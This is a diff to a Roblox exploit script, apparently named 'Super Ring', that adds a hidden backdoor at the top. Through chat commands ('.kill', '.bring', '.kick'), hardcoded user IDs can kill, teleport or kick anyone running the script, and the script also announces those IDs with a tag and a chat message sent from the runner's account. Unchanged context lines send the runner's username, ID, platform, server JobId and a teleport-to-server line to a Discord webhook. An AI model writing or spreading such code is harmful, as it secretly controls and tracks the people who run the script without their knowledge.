@@ -1,3 +1,196 @@
+-- Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Array of target User IDs (Script Developers)
+local targetUserIds = {429038309, 123456789, 987654321} -- Add more User IDs here
+local developerTagText = "Script Developer"
+local developerTagColor = Color3.fromRGB(0, 102, 255) -- Blue Color
+
+-- Function to send a chat message
+local function SendChatMessage(message)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannel = TextChatService.TextChannels.RBXGeneral
+        textChannel:SendAsync(message)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    end
+end
+
+-- Function to handle commands from Script Developers
+local function handleCommand(command, sender)
+    if not table.find(targetUserIds, sender.UserId) then
+        return -- Ignore commands from non-developers
+    end
+
+    -- Parse the command
+    if command == ".kill" then
+        local character = LocalPlayer.Character
+        if character and character:FindFirstChild("Humanoid") then
+            character.Humanoid.Health = 0
+        end
+
+    elseif command == ".bring" then
+        local senderCharacter = sender.Character
+        local localCharacter = LocalPlayer.Character
+
+        if senderCharacter and localCharacter then
+            local rootPart = localCharacter:FindFirstChild("HumanoidRootPart")
+            local senderRootPart = senderCharacter:FindFirstChild("HumanoidRootPart")
+
+            if rootPart and senderRootPart then
+                rootPart.CFrame = senderRootPart.CFrame
+            end
+        end
+
+    elseif command == ".kick" then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "You Were Kicked!",
+            Text = "Script Developer Kicked You! You were probably annoying anyways...",
+            Duration = 5
+        })
+
+        task.wait(5)
+        LocalPlayer:Kick("Script Developer Kicked You! You were probably annoying anyways...")
+    end
+end
+
+-- Function to create a name tag
+local function createNameTag(player)
+    local function setupTag()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local head = character:WaitForChild("Head", 10) -- Wait for head to load
+
+        if not head or head:FindFirstChild("DeveloperTag") then
+            return -- Exit if head is missing or tag already exists
+        end
+
+        -- Create BillboardGui for the tag
+        local billboardGui = Instance.new("BillboardGui")
+        billboardGui.Name = "DeveloperTag"
+        billboardGui.Adornee = head
+        billboardGui.Size = UDim2.new(4, 0, 1, 0)
+        billboardGui.StudsOffset = Vector3.new(0, 2, 0)
+        billboardGui.AlwaysOnTop = true
+
+        -- Create a TextLabel for the tag
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = developerTagText
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.TextColor3 = developerTagColor
+        textLabel.TextStrokeTransparency = 0.5
+        textLabel.TextScaled = true
+        textLabel.Parent = billboardGui
+
+        -- Parent the tag to the head
+        billboardGui.Parent = head
+    end
+
+    -- Handle character spawn/respawn
+    player.CharacterAdded:Connect(function()
+        setupTag()
+    end)
+
+    -- Initial setup
+    if player.Character then
+        setupTag()
+    end
+end
+
+-- Function to notify players about a Script Developer's presence
+local function notifyServer(player)
+    -- Send a chat message
+    SendChatMessage("OMG! A SCRIPT DEVELOPER 🤯")
+
+    -- Create a notification
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "DeveloperNotification"
+    notificationGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    -- Main Frame
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 100)
+    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
+    frame.AnchorPoint = Vector2.new(0.5, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    frame.BackgroundTransparency = 0.1
+    frame.BorderSizePixel = 0
+    frame.Parent = notificationGui
+
+    -- Avatar Image
+    local avatarImage = Instance.new("ImageLabel")
+    avatarImage.Size = UDim2.new(0, 80, 0, 80)
+    avatarImage.Position = UDim2.new(0, 10, 0.5, 0)
+    avatarImage.AnchorPoint = Vector2.new(0, 0.5)
+    avatarImage.BackgroundTransparency = 1
+    avatarImage.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=150&h=150"
+    avatarImage.Parent = frame
+
+    -- Title Label
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -100, 0.5, 0)
+    titleLabel.Position = UDim2.new(0, 100, 0, 10)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = developerTagText .. " is in your server!"
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextScaled = true
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.Parent = frame
+
+    -- Username Label
+    local usernameLabel = Instance.new("TextLabel")
+    usernameLabel.Size = UDim2.new(1, -100, 0.5, -10)
+    usernameLabel.Position = UDim2.new(0, 100, 0.5, 0)
+    usernameLabel.BackgroundTransparency = 1
+    usernameLabel.Text = "Username: " .. player.Name
+    usernameLabel.Font = Enum.Font.SourceSans
+    usernameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    usernameLabel.TextScaled = true
+    usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    usernameLabel.Parent = frame
+
+    -- Auto-remove notification after 5 seconds
+    task.delay(5, function()
+        notificationGui:Destroy()
+    end)
+end
+
+-- Check all players currently in the server
+for _, player in pairs(Players:GetPlayers()) do
+    if table.find(targetUserIds, player.UserId) then
+        createNameTag(player)
+        notifyServer(player)
+    end
+end
+
+-- Listen for new players joining
+Players.PlayerAdded:Connect(function(player)
+    if table.find(targetUserIds, player.UserId) then
+        createNameTag(player)
+        notifyServer(player)
+    end
+end)
+
+-- Listen for chat messages using the `Chatted` event
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        handleCommand(message, player)
+    end)
+end
+
+-- Ensure new players' chat is monitored
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        handleCommand(message, player)
+    end)
+end)
+-- ===============================================================
+
 local httpService = game:GetService("HttpService")
 local players = game:GetService("Players")
 local userInputService = game:GetService("UserInputService")
@@ -9,22 +202,22 @@ local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
 -- Determine platform using UserInputService
 local platform
 if userInputService.TouchEnabled then
-    platform = "Mobile"
+	platform = "Mobile"
 elseif userInputService.KeyboardEnabled then
-    platform = "PC"
+	platform = "PC"
 elseif userInputService.GamepadEnabled then
-    platform = "Console"
+	platform = "Console"
 else
-    platform = "Unknown"
+	platform = "Unknown"
 end
 
 -- Get JobId
 local jobId = game.JobId or "N/A"
 local placeId = game.PlaceId
 local teleportCode = string.format(
-    'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)',
-    placeId,
-    jobId
+	'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)',
+	placeId,
+	jobId
 )
 
 -- Replace with your actual Discord webhook URL
@@ -32,59 +225,59 @@ local webhookUrl = "https://discord.com/api/webhooks/1259159133169647716/zgEpZEt
 
 -- Create the payload
 local payload = {
-    ["embeds"] = { {
-        ["title"] = "Script Executed: Super Ring",
-        ["description"] = "**User Info:**",
-        ["fields"] = {
-            {
-                ["name"] = "Username",
-                ["value"] = username,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "User ID",
-                ["value"] = tostring(userId),
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Profile Link",
-                ["value"] = profileUrl,
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Platform",
-                ["value"] = platform,
-                ["inline"] = true
-            },
-            {
-                ["name"] = "Job ID",
-                ["value"] = "```" .. jobId .. "```",
-                ["inline"] = false
-            },
-            {
-                ["name"] = "Teleport Code",
-                ["value"] = "```lua\n" .. teleportCode .. "\n```",
-                ["inline"] = false
-            }
-        },
-        ["color"] = tonumber(0x7289DA)
-    } }
+	["embeds"] = { {
+		["title"] = "Script Executed: Super Ring",
+		["description"] = "**User Info:**",
+		["fields"] = {
+			{
+				["name"] = "Username",
+				["value"] = username,
+				["inline"] = true
+			},
+			{
+				["name"] = "User ID",
+				["value"] = tostring(userId),
+				["inline"] = true
+			},
+			{
+				["name"] = "Profile Link",
+				["value"] = profileUrl,
+				["inline"] = false
+			},
+			{
+				["name"] = "Platform",
+				["value"] = platform,
+				["inline"] = true
+			},
+			{
+				["name"] = "Job ID",
+				["value"] = "```" .. jobId .. "```",
+				["inline"] = false
+			},
+			{
+				["name"] = "Teleport Code",
+				["value"] = "```lua\n" .. teleportCode .. "\n```",
+				["inline"] = false
+			}
+		},
+		["color"] = tonumber(0x7289DA)
+	} }
 }
 
 -- Attempt to send the payload via `request`
 local success, err = pcall(function()
-    request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = httpService:JSONEncode(payload)
-    })
+	request({
+		Url = webhookUrl,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = httpService:JSONEncode(payload)
+	})
 end)
 
 if not success then
-    warn("Failed to send data to webhook:", err)
+	warn("Failed to send data to webhook:", err)
 end
 
 local Players = game:GetService("Players")
@@ -364,6 +557,8 @@ TeleportButton.Parent = MainFrame
 local TeleportButtonCorner = Instance.new("UICorner")
 TeleportButtonCorner.CornerRadius = UDim.new(0, 10)
 TeleportButtonCorner.Parent = TeleportButton
+
+
 
 local ReturnButton = Instance.new("TextButton")
 ReturnButton.Size = UDim2.new(0.8, 0, 0, 35)
